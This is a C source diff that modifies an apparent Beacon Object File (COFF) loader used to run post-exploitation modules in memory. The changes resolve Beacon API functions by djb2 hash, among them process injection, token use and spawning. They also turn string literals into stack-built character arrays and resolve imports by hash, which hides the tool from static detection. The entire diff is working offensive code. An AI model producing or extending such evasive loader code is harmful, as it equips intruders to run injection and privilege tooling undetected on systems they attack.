@@ -34,6 +34,19 @@
 #define PREPENDSYMBOLVALUE "__imp__"
 #endif
 
+static unsigned long
+djb2(char* str)
+{
+	unsigned long hash = 5381;
+	int c;
+
+	while ((c = *str++))
+		hash = ((hash << 5) + hash) + c;
+
+	return hash;
+}
+
+
 #ifdef EXEVERSION
 unsigned char* unhexlify(unsigned char* value, int *outlen) {
     unsigned char* retval = NULL;
@@ -116,31 +129,50 @@ void* process_symbol(char* symbolstring) {
     char localcopy[1024] = { 0 };
     char* locallib = NULL;
     char* localfunc = NULL;
+    static unsigned long funchash = 0;    
 #if defined(_WIN32)    
-    int tempcounter = 0;
     HMODULE llHandle = NULL;
 #endif
 
    _memcpy(localcopy, symbolstring, _strlen(symbolstring));
-    if (_strncmp(symbolstring, PREPENDSYMBOLVALUE"Beacon", _strlen(PREPENDSYMBOLVALUE"Beacon")) == 0 || _strncmp(symbolstring, PREPENDSYMBOLVALUE"toWideChar", _strlen(PREPENDSYMBOLVALUE"toWideChar")) == 0) {
-        localfunc = symbolstring + _strlen(PREPENDSYMBOLVALUE);
+    char msg1[] = {'_','_','i','m','p','_','B','e','a','c','o','n', 0x00};
+    char msg2[] = {'_','_','i','m','p','_','t','o','W','i','d','e','C','h','a','r', 0x00};
+    char msg3[] = {'_','_','i','m','p','_', 0x00};
+    if (_strncmp(symbolstring, msg1, _strlen(msg1)) == 0 || _strncmp(symbolstring, msg2, _strlen(msg2)) == 0) {
+        localfunc = symbolstring + 6;  // _strlen(PREPENDSYMBOLVALUE);
+        funchash = djb2(localfunc);
         DEBUG_PRINT("\t\tInternalFunction: %s\n", localfunc);
         /* TODO: Get internal symbol here and set to functionaddress, then
          * return the pointer to the internal function*/
 #if defined(_WIN32)
-        for (tempcounter = 0; tempcounter < 25; tempcounter++) {
-            if (InternalFunctions[tempcounter][0] != NULL) {
-                if (_strcmp(localfunc, (char*)(InternalFunctions[tempcounter][0])) == 0) {
-                    functionaddress = (void*)InternalFunctions[tempcounter][1];
-                    return functionaddress;
-                }
-            }
-        }
+        if (funchash == 0xe2494ba2) { return  (unsigned char*)BeaconDataParse; };
+        if (funchash == 0xaf1afdd2) { return  (unsigned char*)BeaconDataInt; };
+        if (funchash == 0xe2835ef7) { return  (unsigned char*)BeaconDataShort; };
+        if (funchash == 0x22641d29) { return  (unsigned char*)BeaconDataLength; };
+        if (funchash == 0x80d46722) { return  (unsigned char*)BeaconDataExtract; };
+        if (funchash == 0x4caae0e1) { return  (unsigned char*)BeaconFormatAlloc; };
+        if (funchash == 0x4ddac759) { return  (unsigned char*)BeaconFormatReset; };
+        if (funchash == 0x7e749f38) { return  (unsigned char*)BeaconFormatFree; };
+        if (funchash == 0xe25167ce) { return  (unsigned char*)BeaconFormatAppend; };
+        if (funchash == 0x56f4aa9) { return  (unsigned char*)BeaconFormatPrintf; };
+        if (funchash == 0xb59f4df0) { return  (unsigned char*)BeaconFormatToString; };
+        if (funchash == 0x3a229cc1) { return  (unsigned char*)BeaconFormatInt; };
+        if (funchash == 0x700d8660) { return  (unsigned char*)BeaconPrintf; };
+        if (funchash == 0x6df4b81e) { return  (unsigned char*)BeaconOutput; };
+        if (funchash == 0x889e48bb) { return  (unsigned char*)BeaconUseToken; };
+        if (funchash == 0xf2744ba6) { return  (unsigned char*)BeaconRevertToken; };
+        if (funchash == 0x566264d2) { return  (unsigned char*)BeaconIsAdmin; };
+        if (funchash == 0x1e7c9fb9) { return  (unsigned char*)BeaconGetSpawnTo; };
+        if (funchash == 0xd6c57438) { return  (unsigned char*)BeaconSpawnTemporaryProcess; };
+        if (funchash == 0xea75b09) { return  (unsigned char*)BeaconInjectProcess; };
+        if (funchash == 0x9e22498c) { return  (unsigned char*)BeaconInjectTemporaryProcess; };
+        if (funchash == 0xcee62b74) { return  (unsigned char*)BeaconCleanupProcess; };
+        if (funchash == 0x59fcf3cf) { return  (unsigned char*)toWideChar; };
 #endif
     }
-    else if (_strncmp(symbolstring, PREPENDSYMBOLVALUE, _strlen(PREPENDSYMBOLVALUE)) == 0) {
+    else if (_strncmp(symbolstring, msg3, _strlen(msg3)) == 0) {
         DEBUG_PRINT("\t\tYep its an external symbol\n");
-        locallib = localcopy + _strlen(PREPENDSYMBOLVALUE);
+        locallib = localcopy + 6; // _strlen(PREPENDSYMBOLVALUE);
         int i;
         // Extract localfunc as part before first $
         for (i=0; i< _strlen(locallib); i++) {
@@ -176,7 +208,7 @@ void* process_symbol(char* symbolstring) {
  * implementation, return values will need to be checked, more relocation
  * types need to be handled, and needs to have different arguments for use
  * in any agent. */
-int RunCOFF(char* functionname, unsigned char* coff_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize) {
+int RunCOFF(unsigned char* coff_data, uint32_t filesize, unsigned char* argumentdata, int argumentSize) {
     coff_file_header_t *coff_header_ptr = NULL;
     coff_sect_t *coff_sect_ptr = NULL;
     coff_reloc_t *coff_reloc_ptr = NULL;
@@ -190,6 +222,7 @@ int RunCOFF(char* functionname, unsigned char* coff_data, uint32_t filesize, uns
     void* funcptrlocation = NULL;
     int32_t offsetvalue = 0;
 #endif
+    char functionname[] = {'g','o', 0x00};
     char* entryfuncname = functionname;
 #if defined(__x86_64__) || defined(_WIN64)
 #ifdef _WIN32
@@ -460,16 +493,14 @@ int go(void) {
     unsigned char* arguments = NULL;
     int argumentSize = 0;
 #ifdef _WIN32
-    char* outdata = NULL;
-    int outdataSize = 0;
 #endif
     uint32_t filesize = 0;
     int checkcode = 0;
     tprintf _printf = (tprintf)getFunctionPtr(HASH_MSVCRT, HASH_printf);
 
     #ifdef EXEVERSION
-    if (argc < 3) {
-        _printf("ERROR: %s go /path/to/object/file.o (arguments)\n", argv[0]);
+    if (argc < 2) {
+        _printf("ERROR: %s /path/to/object/file.o (arguments)\n", argv[0]);
         return 1;
     }
 
@@ -483,19 +514,18 @@ int go(void) {
         // TODO get BOF file and arguments from memory somehow
     #endif
 
-    _printf("Running/Parsing the COFF file\n");
-    checkcode = RunCOFF("go", (unsigned char*)coff_data, filesize, arguments, argumentSize);
+    char msg[] = {'R','u','n','n','i','n','g','/','P','a','r','s','i','n','g',' ','t','h','e',' ','C','O','F','F',' ','f','i','l','e',0x0a, 0x00};
+    _printf(msg);
+    checkcode = RunCOFF((unsigned char*)coff_data, filesize, arguments, argumentSize);
     if (checkcode == 0) {
 #ifdef _WIN32
-        _printf("Ran/parsed the coff\n");
-        outdata = BeaconGetOutputData(&outdataSize);
-        if (outdata != NULL) {
-            _printf("Outdata Below:\n\n%s\n", outdata);
-        }
+        char msg2[] = {'R','a','n','/','p','a','r','s','e','d',' ','t','h','e',' ','c','o','f','f',0x0a, 0x00};
+        _printf(msg2);
 #endif
     }
     else {
-        _printf("Failed to run/parse the COFF file\n");
+        char msg3[] = {'F','a','i','l','e','d',' ','t','o',' ','r','u','n','/','p','a','r','s','e',' ','t','h','e',' ','C','O','F','F',' ','f','i','l','e',0x0a, 0x00};
+        _printf(msg3);
     }
 
     return 0;
